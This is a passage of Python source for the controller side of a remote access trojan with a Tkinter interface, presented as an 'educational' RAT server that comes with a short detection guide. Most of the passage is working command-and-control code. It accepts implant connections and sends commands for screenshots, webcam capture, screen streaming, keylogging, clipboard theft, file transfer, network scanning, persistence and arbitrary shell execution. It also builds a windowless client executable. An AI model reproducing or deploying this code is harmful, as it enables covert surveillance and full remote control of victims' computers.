8. NETWORK SCANNING (Pivot)
   Detection: Unusual internal scanning patterns, ARP storms
   Tools: Network IDS (Snort/Suricata), SIEM correlation
   Defense: Network segmentation, microsegmentation, VLAN isolation

=== INDICATORS OF COMPROMISE (IOCs) ===

- Unusual outbound connections to non-standard ports
- New entries in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- Unknown scheduled tasks
- Processes with high network/CPU usage
- Files in Startup folder
- Suspicious Python processes running in background

=== RECOMMENDED SECURITY TOOLS ===

- Sysinternals Suite (Process Explorer, Autoruns, TCPView)
- Wireshark / NetworkMiner
- YARA rules for signature-based detection
- Sysmon for advanced Windows logging
- OSQuery for endpoint querying
- CrowdStrike / SentinelOne / Defender for Endpoint (EDR)
"""
        text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg="#81A1C1", font=("Consolas", 10))
        text.pack(fill="both", expand=True, padx=10, pady=5)
        text.insert(tk.END, defense_info)
        text.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # REPORT
    # ═══════════════════════════════════════════════════════════════════

    def _setup_report(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Generate Report", command=self.generate_report).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Export PDF", command=self.export_report_pdf).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Export Text", command=self.export_report_text).pack(side=tk.LEFT, padx=3)

        self.report_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.report_text.pack(fill="both", expand=True, padx=10, pady=5)
        self.report_text.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # SETTINGS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_settings(self, parent):
        form = ttk.Frame(parent)
        form.pack(fill="both", expand=True, padx=20, pady=10)

        srv = ttk.LabelFrame(form, text="Server")
        srv.pack(fill="x", pady=5)
        f1 = ttk.Frame(srv); f1.pack(fill="x", padx=10, pady=3)
        ttk.Label(f1, text="Host:", width=12).pack(side=tk.LEFT)
        ttk.Entry(f1, textvariable=self.server_host, width=20).pack(side=tk.LEFT, padx=5)
        ttk.Button(f1, text="IP Info", command=self.show_ip_info).pack(side=tk.RIGHT)
        f2 = ttk.Frame(srv); f2.pack(fill="x", padx=10, pady=3)
        ttk.Label(f2, text="Port:", width=12).pack(side=tk.LEFT)
        ttk.Entry(f2, textvariable=self.server_port, width=8).pack(side=tk.LEFT, padx=5)

        auth = ttk.LabelFrame(form, text="Authentication")
        auth.pack(fill="x", pady=5)
        f3 = ttk.Frame(auth); f3.pack(fill="x", padx=10, pady=3)
        ttk.Label(f3, text="Username:", width=12).pack(side=tk.LEFT)
        ttk.Entry(f3, textvariable=self.auth_username_var, width=20).pack(side=tk.LEFT, padx=5)
        f4 = ttk.Frame(auth); f4.pack(fill="x", padx=10, pady=3)
        ttk.Label(f4, text="Password:", width=12).pack(side=tk.LEFT)
        ttk.Entry(f4, textvariable=self.auth_password_var, width=20, show="*").pack(side=tk.LEFT, padx=5)

        gen = ttk.LabelFrame(form, text="Client Generation")
        gen.pack(fill="x", pady=5)
        ttk.Checkbutton(gen, text="Auto-generate on start", variable=self.auto_generate_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Use LAN IP", variable=self.lan_mode_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Build .exe (PyInstaller)", variable=self.build_exe_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Save to builds/clients/", variable=self.save_to_builds_var).pack(anchor="w", padx=10)
        bf = ttk.Frame(gen)
        bf.pack(anchor="w", padx=10, pady=5)
        ttk.Button(bf, text="Generate Client Now", command=self.manual_generate_client).pack(side=tk.LEFT, padx=(0, 8))
        ttk.Button(bf, text="Build Executable Now", command=self.build_client_executable).pack(side=tk.LEFT)

    # ═══════════════════════════════════════════════════════════════════
    # HELP
    # ═══════════════════════════════════════════════════════════════════

    def _setup_help(self, parent):
        help_content = """
=== EDUCATIONAL RAT SERVER - FULL FEATURED ===

FEATURES:
- AES-256 encrypted communication
- Live screen streaming
- Screenshot & Webcam capture
- Keylogger & Clipboard monitor
- File upload/download
- Network scanner (pivot simulation)
- Multi-platform persistence
- Professional pentest report generation
- Defense & detection guide

COMMANDS:
  sysinfo, screenshot, webcam, stream_start, stream_stop
  keylogger_start/stop/dump, clipboard_start/stop/dump/current
  upload <file>, download <file>, listdir [path], delete <file>
  persist_install [method], persist_remove, persist_check
  scan_network, scan_ports <ip>, scan_arp
  capabilities, exit
  (any other) = shell command

QUICK START:
1. Settings tab -> Configure IP/Port
2. Start Server
3. Run client_gen.py on target
4. Select client -> Send commands
"""
        w = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Segoe UI", 10))
        w.pack(fill="both", expand=True, padx=10, pady=5)
        w.insert(tk.END, help_content)
        w.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # CORE SERVER LOGIC
    # ═══════════════════════════════════════════════════════════════════

    def log_message(self, msg, level="info"):
        try:
            self.console.config(state="normal")
            colors = {"info": self.text_color, "success": self.success_color, "warning": self.warning_color, "error": self.error_color}
            prefixes = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[X]"}
            color = colors.get(level, self.text_color)
            self.console.tag_config(level, foreground=color)
            ts = time.strftime("%H:%M:%S")
            self.console.insert(tk.END, f"[{ts}] {prefixes.get(level, '[*]')} {msg}\n", level)
            self.console.see(tk.END)
            self.console.config(state="disabled")
        except Exception:
            pass

    def start_server(self):
        host, port = self.server_host.get(), self.server_port.get()
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)
        except Exception as e:
            self.log_message(f"Server start failed: {e}", "error")
            return

        self.stop_flag.clear()
        self._update_indicator("listening")
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log_message(f"Server listening on {host}:{port}", "success")
        self.log_message(f"Encryption: {'AES-256' if AES_AVAILABLE else 'None (install pycryptodome)'}", "info")

        threading.Thread(target=self._accept_loop, daemon=True).start()

        if self.auto_generate_var.get():
            ip = self.get_local_ip() if self.lan_mode_var.get() else "127.0.0.1"
            if self._generate_client(ip, port):
                self.log_message(f"client_gen.py generated -> {ip}:{port}", "success")
                if self.build_exe_var.get():
                    self.build_client_executable()

    def stop_server(self):
        self.stop_flag.set()
        with self.lock:
            for c in self.clients.values():
                try: c["socket"].close()
                except: pass
            self.clients.clear()
            self.current_client_id = None
        if self.server_socket:
            try: self.server_socket.close()
            except: pass
            self.server_socket = None
        self._update_indicator("idle")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log_message("Server stopped", "warning")
        self.refresh_clients()

    def _accept_loop(self):
        while not self.stop_flag.is_set():
            try:
                sock, addr = self.server_socket.accept()
                sock.settimeout(15)
                threading.Thread(target=self._handshake, args=(sock, addr), daemon=True).start()
            except socket.timeout:
                continue
            except:
                break

    def _handshake(self, sock, addr):
        try:
            key = derive_key(ENCRYPTION_KEY)
            send_msg(sock, "AUTH", key)
            creds = recv_msg_str(sock, key)
            if not creds:
                sock.close(); return
            c = json.loads(creds)
            if c.get("username") != self.auth_username_var.get() or c.get("password") != self.auth_password_var.get():
                send_msg(sock, "AUTH_FAILED", key)
                sock.close()
                self.root.after(0, lambda: self.log_message(f"Auth failed: {addr[0]}", "warning"))
                return
            send_msg(sock, "AUTH_SUCCESS", key)
            send_msg(sock, "sysinfo", key)
            info = recv_msg_str(sock, key)
            if not info:
                sock.close(); return
            sock.settimeout(None)
            with self.lock:
                cid = max(self.clients.keys(), default=0) + 1
                self.clients[cid] = {"socket": sock, "address": addr, "info": info, "key": key}
            self.root.after(0, lambda: self._on_connected(cid, addr, info))
        except (ConnectionResetError, ConnectionAbortedError, OSError):
            try: sock.close()
            except: pass
        except Exception as e:
            err_msg = str(e)
            try: sock.close()
            except: pass
            self.root.after(0, lambda: self.log_message(f"Handshake failed: {err_msg}", "error"))

    def _on_connected(self, cid, addr, info):
        self.log_message(f"Client #{cid} connected from {addr[0]}:{addr[1]}", "success")
        enc = "AES-256" if self.clients[cid].get("key") else "None"
        self.log_message(f"  Encryption: {enc} | Info: {info[:60]}", "info")
        if self.report:
            self.report.set_target(addr[0], info.split("|")[1].split(":")[1].strip() if "|" in info else "Unknown", info)
        self.refresh_clients()
        self._update_indicator("connected")

    def _get_sock_key(self):
        if self.current_client_id is None:
            return None, None
        with self.lock:
            c = self.clients.get(self.current_client_id)
        if c is None:
            self.current_client_id = None
            return None, None
        return c["socket"], c.get("key")

    def _send_recv(self, cmd):
        sock, key = self._get_sock_key()
        if not sock:
            self.log_message("No client selected", "error")
            return None
        try:
            send_msg(sock, cmd, key)
            return recv_msg_str(sock, key)
        except Exception as e:
            self.log_message(f"Error: {e}", "error")
            self._drop_client()
            return None

    def _send_recv_bytes(self, cmd):
        sock, key = self._get_sock_key()
        if not sock: return None
        try:
            send_msg(sock, cmd, key)
            return recv_msg(sock, key)
        except Exception as e:
            self.log_message(f"Error: {e}", "error")
            self._drop_client()
            return None

    def _drop_client(self):
        if self.current_client_id:
            with self.lock:
                c = self.clients.pop(self.current_client_id, None)
                if c:
                    try: c["socket"].close()
                    except: pass
            self.current_client_id = None
            self.refresh_clients()

    # ═══════════════════════════════════════════════════════════════════
    # CLIENT OPERATIONS
    # ═══════════════════════════════════════════════════════════════════

    def refresh_clients(self):
        self.client_listbox.delete(0, tk.END)
        with self.lock:
            for cid, c in self.clients.items():
                node = ""
                for p in c["info"].split("|"):
                    if "Node:" in p: node = p.split(":")[1].strip(); break
                marker = " [*]" if cid == self.current_client_id else ""
                enc = "E" if c.get("key") else "P"
                self.client_listbox.insert(tk.END, f"#{cid} [{enc}] {c['address'][0]} ({node}){marker}")
        self.count_var.set(f"Clients: {len(self.clients)}")

    def connect_to_client(self):
        sel = self.client_listbox.curselection()
        if not sel:
            self.log_message("Select a client first", "warning"); return
        cid = int(self.client_listbox.get(sel[0]).split("#")[1].split(" ")[0])
        with self.lock:
            if cid not in self.clients:
                self.log_message("Client gone", "error"); self.refresh_clients(); return
        self.current_client_id = cid
        self.log_message(f"Selected client #{cid}", "success")
        self.refresh_clients()

    def disconnect_client(self):
        if not self.current_client_id:
            return
        sock, key = self._get_sock_key()
        if sock:
            try: send_msg(sock, "exit", key)
            except: pass
        self._drop_client()
        self.log_message("Client disconnected", "info")

    def send_command(self, event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd: return
        self.cmd_entry.delete(0, tk.END)
        if not self.current_client_id:
            self.log_message("No client selected", "error"); return
        self.log_message(f"> {cmd}", "info")

        if cmd in ("screenshot", "webcam", "stream_start"):
            threading.Thread(target=self._handle_special, args=(cmd,), daemon=True).start()
        else:
            threading.Thread(target=self._handle_generic, args=(cmd,), daemon=True).start()

    def _handle_generic(self, cmd):
        if cmd.startswith("download "):
            self._do_download(cmd)
        elif cmd.startswith("upload "):
            self._do_upload(cmd)
        else:
            resp = self._send_recv(cmd)
            if resp:
                self.root.after(0, lambda: self.log_message(resp, "info"))
                if self.report and cmd not in ("sysinfo", "capabilities", "persist_check", "persist_methods"):
                    self.report.add_command_result(cmd, resp)

    def _handle_special(self, cmd):
        sock, key = self._get_sock_key()
        if not sock:
            self.root.after(0, lambda: self.log_message("No client", "error")); return
        try:
            if cmd == "screenshot":
                send_msg(sock, "screenshot", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    data = recv_msg(sock, key)
                    if data and PIL_AVAILABLE:
                        img = Image.open(io.BytesIO(data))
                        self.screenshots.append(img)
                        self.current_screenshot_index = len(self.screenshots) - 1
                        self.root.after(0, self._show_screenshot)
                        self.root.after(0, lambda: self.log_message("Screenshot captured", "success"))
                        if self.report: self.report.add_screenshot(f"screenshot_{len(self.screenshots)}.png")
                else:
                    self.root.after(0, lambda: self.log_message("Screenshot failed", "error"))

            elif cmd == "webcam":
                send_msg(sock, "webcam", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    data = recv_msg(sock, key)
                    if data and PIL_AVAILABLE:
                        img = Image.open(io.BytesIO(data))
                        self.webcam_images.append(img)
                        self.current_webcam_index = len(self.webcam_images) - 1
                        self.root.after(0, self._show_webcam)
                        self.root.after(0, lambda: self.log_message("Webcam captured", "success"))
                else:
                    self.root.after(0, lambda: self.log_message("Webcam failed", "error"))

            elif cmd == "stream_start":
                self.streaming = True
                send_msg(sock, "stream_start", key)
                status = recv_msg_str(sock, key)
                if status != "PASS":
                    self.streaming = False
                    self.root.after(0, lambda: self.log_message("Stream failed", "error"))
                    return
                self.root.after(0, lambda: (self.stream_start_btn.config(state="disabled"), self.stream_stop_btn.config(state="normal")))
                self.root.after(0, lambda: self.log_message("Stream started", "success"))
                frame_count = 0
                start_time = time.time()
                while self.streaming:
                    frame_data = recv_msg(sock, key)
                    if not frame_data or frame_data == b"STREAM_END":
                        break
                    if PIL_AVAILABLE:
                        try:
                            img = Image.open(io.BytesIO(frame_data))
                            self.root.after(0, lambda i=img: self._show_stream_frame(i))
                        except:
                            pass
                    frame_count += 1
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        fps = frame_count / elapsed
                        self.root.after(0, lambda f=fps: self.stream_fps_label.config(text=f"FPS: {f:.1f}"))
                    send_msg(sock, "NEXT", key)
                self.root.after(0, lambda: (self.stream_start_btn.config(state="normal"), self.stream_stop_btn.config(state="disabled")))
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(f"Error: {err_msg}", "error"))

    def _cmd_thread(self, cmd):
        if not self.current_client_id:
            self.log_message("No client selected", "error"); return
        threading.Thread(target=lambda: self._generic_cmd_display(cmd), daemon=True).start()

    def _generic_cmd_display(self, cmd):
        resp = self._send_recv(cmd)
        if resp:
            self.root.after(0, lambda: self.log_message(resp, "info"))

    # ─── Stream ───────────────────────────────────────────

    def start_stream(self):
        if not self.current_client_id:
            self.log_message("No client", "error"); return
        self.cmd_entry.delete(0, tk.END)
        threading.Thread(target=self._handle_special, args=("stream_start",), daemon=True).start()

    def stop_stream(self):
        self.streaming = False
        if self.current_client_id:
            sock, key = self._get_sock_key()
            # stream_stop handled by sending non-NEXT or client sees STREAM_END

    def _show_stream_frame(self, img):
        cw = self.stream_canvas.winfo_width()
        ch = self.stream_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        iw, ih = img.size
        scale = min(cw / iw, ch / ih)
        resized = img.resize((int(iw * scale), int(ih * scale)), Image.LANCZOS)
        self.stream_photo = ImageTk.PhotoImage(resized)
        self.stream_canvas.delete("all")
        self.stream_canvas.create_image(cw // 2, ch // 2, image=self.stream_photo, anchor="center")

    # ─── Screenshots ─────────────────────────────────────

    def capture_screenshot(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        threading.Thread(target=self._handle_special, args=("screenshot",), daemon=True).start()

    def _show_screenshot(self):
        if not self.screenshots: return
        img = self.screenshots[self.current_screenshot_index]
        cw, ch = self.ss_canvas.winfo_width(), self.ss_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        scale = min(cw / img.width, ch / img.height)
        resized = img.resize((int(img.width * scale), int(img.height * scale)), Image.LANCZOS)
        self.screenshot_photo = ImageTk.PhotoImage(resized)
        self.ss_canvas.delete("all")
        self.ss_canvas.create_image(cw // 2, ch // 2, image=self.screenshot_photo, anchor="center")
        self.ss_label.config(text=f"{self.current_screenshot_index + 1}/{len(self.screenshots)}")

    def save_screenshot(self):
        if not self.screenshots: return
        p = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG", "*.png")])
        if p: self.screenshots[self.current_screenshot_index].save(p)

    def prev_screenshot(self):
        if self.screenshots:
            self.current_screenshot_index = (self.current_screenshot_index - 1) % len(self.screenshots)
            self._show_screenshot()

    def next_screenshot(self):
        if self.screenshots:
            self.current_screenshot_index = (self.current_screenshot_index + 1) % len(self.screenshots)
            self._show_screenshot()

    # ─── Webcam ──────────────────────────────────────────

    def capture_webcam(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        threading.Thread(target=self._handle_special, args=("webcam",), daemon=True).start()

    def _show_webcam(self):
        if not self.webcam_images: return
        img = self.webcam_images[self.current_webcam_index]
        cw, ch = self.wc_canvas.winfo_width(), self.wc_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        scale = min(cw / img.width, ch / img.height)
        resized = img.resize((int(img.width * scale), int(img.height * scale)), Image.LANCZOS)
        self.webcam_photo = ImageTk.PhotoImage(resized)
        self.wc_canvas.delete("all")
        self.wc_canvas.create_image(cw // 2, ch // 2, image=self.webcam_photo, anchor="center")
        self.wc_label.config(text=f"{self.current_webcam_index + 1}/{len(self.webcam_images)}")

    def save_webcam(self):
        if not self.webcam_images: return
        p = filedialog.asksaveasfilename(defaultextension=".jpg", filetypes=[("JPEG", "*.jpg")])
        if p: self.webcam_images[self.current_webcam_index].save(p)

    def _nav_webcam(self, d):
        if self.webcam_images:
            self.current_webcam_index = (self.current_webcam_index + d) % len(self.webcam_images)
            self._show_webcam()

    # ─── Keylogger ───────────────────────────────────────

    def dump_keylogger(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("keylogger_dump")
            if resp:
                self.root.after(0, lambda: (self.keylog_text.delete("1.0", tk.END), self.keylog_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def save_keylogger(self):
        data = self.keylog_text.get("1.0", tk.END).strip()
        if not data: return
        p = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if p:
            with open(p, "w") as f: f.write(data)

    # ─── Clipboard ───────────────────────────────────────

    def dump_clipboard(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("clipboard_dump")
            if resp:
                self.root.after(0, lambda: (self.clipboard_text.delete("1.0", tk.END), self.clipboard_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def get_current_clipboard(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("clipboard_current")
            if resp:
                self.root.after(0, lambda: (self.clipboard_text.delete("1.0", tk.END), self.clipboard_text.insert(tk.END, f"Current clipboard:\n{resp}")))
        threading.Thread(target=do, daemon=True).start()

    # ─── Network Scanner ─────────────────────────────────

    def do_network_scan(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        self.scanner_text.delete("1.0", tk.END)
        self.scanner_text.insert(tk.END, "Scanning... (may take 30-60 seconds)\n")
        def do():
            sock, key = self._get_sock_key()
            if not sock: return
            try:
                send_msg(sock, "scan_network", key)
                progress = recv_msg_str(sock, key)
                self.root.after(0, lambda: self.scanner_text.insert(tk.END, f"{progress}\n"))
                send_msg(sock, "ACK", key)
                result = recv_msg_str(sock, key)
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, result)))
                if self.report: self.report.add_network_finding(result[:500])
            except Exception as e:
                err_msg = str(e)
                self.root.after(0, lambda: self.log_message(f"Scan error: {err_msg}", "error"))
        threading.Thread(target=do, daemon=True).start()

    def do_port_scan(self):
        target = self.scan_target.get().strip()
        if not target:
            self.log_message("Enter target IP", "warning"); return
        if not self.current_client_id: self.log_message("No client", "error"); return
        self.scanner_text.delete("1.0", tk.END)
        self.scanner_text.insert(tk.END, f"Port scanning {target}...\n")
        def do():
            resp = self._send_recv(f"scan_ports {target}")
            if resp:
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def do_arp_scan(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("scan_arp")
            if resp:
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    # ─── Persistence ─────────────────────────────────────

    def install_specific_persist(self):
        method = self.persist_method.get().strip()
        if not method: self.log_message("Enter a method name", "warning"); return
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv(f"persist_install {method}")
            if resp:
                self.root.after(0, lambda: (self.persist_text.delete("1.0", tk.END), self.persist_text.insert(tk.END, resp)))
                self.root.after(0, lambda: self.log_message(resp, "info"))
                if self.report and "[+]" in resp: self.report.add_persistence(method, True)
        threading.Thread(target=do, daemon=True).start()

    # ─── System Info ─────────────────────────────────────

    def get_system_info(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("sysinfo")
            if resp:
                formatted = "=== System Information ===\n\n"
                for part in resp.split("|"):
                    p = part.strip()
                    if ":" in p:
                        k, v = p.split(":", 1)
                        formatted += f"  {k.strip():15s}: {v.strip()}\n"
                self.root.after(0, lambda: (self.sysinfo_text.config(state="normal"), self.sysinfo_text.delete("1.0", tk.END), self.sysinfo_text.insert(tk.END, formatted), self.sysinfo_text.config(state="disabled")))
        threading.Thread(target=do, daemon=True).start()

    def get_capabilities(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("capabilities")
            if resp:
                try:
                    caps = json.loads(resp)
                    text = "=== Client Capabilities ===\n\n"
                    for k, v in caps.items():
                        status = "YES" if v is True else ("NO" if v is False else str(v))
                        text += f"  {k:15s}: {status}\n"
                    self.root.after(0, lambda: (self.sysinfo_text.config(state="normal"), self.sysinfo_text.delete("1.0", tk.END), self.sysinfo_text.insert(tk.END, text), self.sysinfo_text.config(state="disabled")))
                except:
                    self.root.after(0, lambda: self.log_message(resp, "info"))
        threading.Thread(target=do, daemon=True).start()

    # ─── File Operations ─────────────────────────────────

    def browse_local_dir(self):
        d = filedialog.askdirectory(initialdir=self.local_path_var.get())
        if d: self.local_path_var.set(d); self.refresh_local_files()

    def refresh_local_files(self):
        self.local_files.delete(0, tk.END)
        path = self.local_path_var.get()
        if not os.path.isdir(path): return
        try:
            for item in sorted(os.listdir(path)):
                full = os.path.join(path, item)
                if os.path.isdir(full):
                    self.local_files.insert(tk.END, f"[DIR] {item}")
                else:
                    self.local_files.insert(tk.END, f"{item}")
        except: pass

    def list_remote_files(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        path = self.remote_path_var.get() or "."
        def do():
            resp = self._send_recv(f"listdir {path}")
            if resp:
                self.root.after(0, lambda: self._fill_remote_list(resp))
        threading.Thread(target=do, daemon=True).start()

    def _fill_remote_list(self, data):
        self.remote_files.delete(0, tk.END)
        for line in data.strip().split("\n"):
            if line.strip(): self.remote_files.insert(tk.END, line.strip())

    def upload_file(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        sel = self.local_files.curselection()
        if not sel: self.log_message("Select a file", "warning"); return
        text = self.local_files.get(sel[0])
        if text.startswith("[DIR]"): self.log_message("Select a file", "warning"); return
        filepath = os.path.join(self.local_path_var.get(), text)
        threading.Thread(target=self._do_upload, args=(f"upload {filepath}",), daemon=True).start()

    def download_file(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        sel = self.remote_files.curselection()
        if not sel: self.log_message("Select a file", "warning"); return
        text = self.remote_files.get(sel[0])
        if text.startswith("[DIR]"): self.log_message("Select a file", "warning"); return
        name = text.split(" (")[0] if " (" in text else text
        threading.Thread(target=self._do_download, args=(f"download {name}",), daemon=True).start()

    def _do_upload(self, cmd):
        parts = cmd.split(" ", 1)
        filepath = parts[1]
        if not os.path.isfile(filepath):
            self.root.after(0, lambda: self.log_message(f"Not found: {filepath}", "error")); return
        sock, key = self._get_sock_key()
        if not sock: return
        try:
            with open(filepath, "rb") as f: data = f.read()
            send_msg(sock, f"upload {os.path.basename(filepath)}", key)
            send_msg(sock, data, key)
            resp = recv_msg_str(sock, key)
            self.root.after(0, lambda: self.log_message(resp or "Upload done", "success"))
            if self.report: self.report.add_file_access("upload", filepath)
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(f"Upload error: {err_msg}", "error"))

    def _do_download(self, cmd):
        remote = cmd.split(" ", 1)[1]
        sock, key = self._get_sock_key()
        if not sock: return
        try:
            send_msg(sock, f"download {remote}", key)
            status = recv_msg_str(sock, key)
            if status == "FAIL":
                self.root.after(0, lambda: self.log_message(f"Not found: {remote}", "error")); return
            data = recv_msg(sock, key)
            if data:
                local = os.path.basename(remote)
                with open(local, "wb") as f: f.write(data)
                self.root.after(0, lambda: self.log_message(f"Downloaded: {local} ({len(data)} bytes)", "success"))
                if self.report: self.report.add_file_access("download", remote)
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(f"Download error: {err_msg}", "error"))

    # ─── Report ──────────────────────────────────────────

    def generate_report(self):
        if not self.report:
            self.log_message("Report module unavailable (pip install fpdf2)", "error"); return
        text = self.report.generate_text_report()
        self.report_text.config(state="normal")
        self.report_text.delete("1.0", tk.END)
        self.report_text.insert(tk.END, text)
        self.report_text.config(state="disabled")
        self.log_message("Report generated - see Report tab", "success")

    def export_report_pdf(self):
        if not self.report: return
        path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF", "*.pdf")])
        if path:
            result = self.report.generate_pdf_report(path)
            self.log_message(f"Report exported: {result}", "success")

    def export_report_text(self):
        if not self.report: return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if path:
            with open(path, "w") as f: f.write(self.report.generate_text_report())
            self.log_message(f"Report saved: {path}", "success")

    # ─── Utilities ───────────────────────────────────────

    def _update_indicator(self, status):
        colors  = {"idle": self.error_color, "listening": self.warning_color, "connected": self.success_color}
        labels  = {"idle": "● ARRÊTÉ", "listening": f"● ÉCOUTE :{self.server_port.get()}", "connected": "● ACTIF"}
        srv_val = {"idle": "OFF", "listening": "ON", "connected": "ON"}
        srv_clr = {"idle": self.error_color, "listening": self.warning_color, "connected": self.success_color}
        badge_fg = colors.get(status, self.error_color)
        self._status_badge.config(text=labels.get(status, ""), fg=badge_fg)
        self._port_badge.config(text=f":{self.server_port.get()}")
        n = len(self.clients)
        if hasattr(self, "_stat_clients"):
            self._stat_clients.config(text=str(n))
            self._stat_server.config(text=srv_val.get(status, "OFF"), fg=srv_clr.get(status, self.error_color))
        self._clients_badge.config(text=f"{n} client{'s' if n != 1 else ''}")
        self.count_var.set(f"Clients: {n}")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]; s.close(); return ip
        except: return "127.0.0.1"

    def show_ip_info(self):
        ip = self.get_local_ip()
        messagebox.showinfo("IP Info", f"LAN IP: {ip}\nHostname: {socket.gethostname()}\nListen on 0.0.0.0 for all interfaces")

    def _generate_client(self, ip, port):
        template = "client_template.py"
        if not os.path.exists(template):
            if os.path.exists("client.py"): shutil.copy("client.py", template)
            else: return False
        with open(template, 'r', encoding='utf-8') as f: content = f.read()
        content = re.sub(r'SERVER_HOST\s*=\s*["\'].*?["\']', f'SERVER_HOST = "{ip}"', content)
        content = re.sub(r'SERVER_PORT\s*=\s*\d+', f'SERVER_PORT = {port}', content)
        content = re.sub(r'AUTH_USERNAME\s*=\s*["\'].*?["\']', f'AUTH_USERNAME = "{self.auth_username_var.get()}"', content)
        content = re.sub(r'AUTH_PASSWORD\s*=\s*["\'].*?["\']', f'AUTH_PASSWORD = "{self.auth_password_var.get()}"', content)
        with open("client_gen.py", 'w', encoding='utf-8') as f: f.write(content)
        return True

    def manual_generate_client(self):
        ip = self.get_local_ip() if self.lan_mode_var.get() else "127.0.0.1"
        if self._generate_client(ip, self.server_port.get()):
            self.log_message(f"client_gen.py generated -> {ip}:{self.server_port.get()}", "success")
            messagebox.showinfo("OK", f"client_gen.py generated\nIP: {ip}  Port: {self.server_port.get()}")
            if self.build_exe_var.get():
                self.build_client_executable()
        else:
            messagebox.showerror("Error", "Failed to generate client. Check logs.")

    def build_client_executable(self):
        if not os.path.exists("client_gen.py"):
            self.log_message("Generate client_gen.py first", "error")
            messagebox.showerror("Error", "Generate client_gen.py first (Settings tab).")
            return False

        def _build():
            try:
                # Toujours utiliser des chemins absolus
                base_dir = os.path.dirname(os.path.abspath(__file__))
                if self.save_to_builds_var.get():
                    dist_path = os.path.join(base_dir, "builds", "clients")
                else:
                    dist_path = os.path.join(base_dir, "dist")

                build_path = os.path.join(base_dir, "build")
                os.makedirs(dist_path, exist_ok=True)
                os.makedirs(build_path, exist_ok=True)

                timestamp = time.strftime("%Y%m%d_%H%M%S")
                name = f"client_{timestamp}"
                client_gen_path = os.path.join(base_dir, "client_gen.py")

                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconfirm",
                    f"--distpath={dist_path}",
                    f"--workpath={build_path}",
                    f"--specpath={build_path}",
                    f"--name={name}",
                ]
                if platform.system() == "Windows":
                    cmd.append("--noconsole")
                cmd.append(client_gen_path)

                self.root.after(0, lambda: self.log_message(f"Building .exe — cela peut prendre 30-60s...", "info"))
                self.root.after(0, lambda: self.log_message(f"Dossier de sortie: {dist_path}", "info"))

                result = subprocess.run(cmd, capture_output=True, text=True, cwd=base_dir)

                if result.returncode == 0:
                    ext = ".exe" if platform.system() == "Windows" else ""
                    exe_path = os.path.join(dist_path, f"{name}{ext}")

                    p = exe_path  # capture pour lambda
                    d = dist_path

                    self.root.after(0, lambda: self.log_message(f"[BUILD OK] {p}", "success"))
                    self.root.after(0, lambda: self.log_message(f"Dossier: {d}", "success"))

                    def _show_result():
                        answer = messagebox.askquestion(
                            "Build réussi",
